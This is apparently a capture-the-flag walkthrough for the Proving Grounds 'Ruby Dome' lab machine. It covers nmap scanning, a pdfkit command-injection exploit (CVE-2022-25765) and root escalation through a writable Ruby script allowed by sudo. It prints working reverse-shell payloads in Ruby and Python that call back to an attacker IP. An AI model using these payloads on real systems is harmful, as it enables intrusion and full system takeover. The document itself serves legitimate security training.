---
layout: default
title: Ruby Dome
parent: Proving Grounds Practice - Linux
nav_order: 12
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/rubydome]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.192.22

Nmap scan report for 192.168.192.22

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)

3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
|_http-title: RubyDome HTML to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.52 seconds
```

# Enumeration

---

## 3000 | HTTP

The site provides a text entry box for RubyDome HTML to PDF conversion.

![index](../../../assets/images/ctfs/proving_grounds/rubydome/index.png)

If we run http://localhost.com in the text field and click "Conver to PDF" we can an error page.

![error](../../../assets/images/ctfs/proving_grounds/rubydome/error.png)

Searching searchsploit for "PDFKit" we return a result for "pdfkit v0.8.7.2 - Command Injection"

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/rubydome]
└─$ searchsploit pdfkit
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
pdfkit v0.8.7.2 - Command Injection                                   | ruby/local/51293.py
---------------------------------------------------------------------- ---------------------------------

```

# Exploitation

---

Copied 51293.py exploit to the pwd and executed the following command

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/rubydome]
└─$ python3 51293.py -s 192.168.45.217 9001 -w http://192.168.192.22:3000/pdf -p url

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....

UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Sent to Target Website Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.45.217","9001"))'`
LOCALIP: 192.168.45.217:9001
WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 9001".
WEBSITE: http://192.168.192.22:3000/pdf
POSTARG: url
EXPLOIT: Payload sent to website!
SUCCESS: Exploit performed action.

```

Received a reverse shell on the netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/rubydome]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.192.22] 46414
id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)

```

# Post-Exploitation

---

We gain the reverse shell as user Andrew

## Check Sudo permissions for Andrew

```bash
andrew@rubydome:~$ sudo -l
sudo -l
Matching Defaults entries for andrew on rubydome:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
andrew@rubydome:~$ ls -la /home/andrew/app
```

We can execute _/usr/bin/ruby /home/andrew/app/app.rb_ and we have full permissions for _app.rb_

```bash
andrew@rubydome:~$ ls -la /home/andrew/app
ls -la /home/andrew/app
total 20
drwxr-xr-x 2 andrew andrew 4096 Apr 25  2023 .
drwxr-x--- 3 andrew andrew 4096 Jun 13 23:21 ..
-rwxrwx--- 1 andrew andrew 1032 Apr 24  2023 app.rb
-rw-rw-r-- 1 andrew andrew 8171 Jun  8 15:33 page.pdf

```

In ruby we can leverage _%x{ command }_ to get command execution.

We can simply edit _app.rb_ and add a Python reverse shell one-liner that executes when we execute the file.

We also need to edit the port set by the file since the current port 3000 is already in use.

We can do this with _set :port 3001_

```bash
set :port 3001
%x{ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.217",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' }
```

![app](../../../assets/images/ctfs/proving_grounds/rubydome/app.png)

Now we can just execute _app.rb_ and get a reverse shell on a secondary netcat listener

```bash
andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE]
└─$ nc -nlvp 9002
listening on [any] 9002 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.192.22] 56982
# id
id
uid=0(root) gid=0(root) groups=0(root)

```
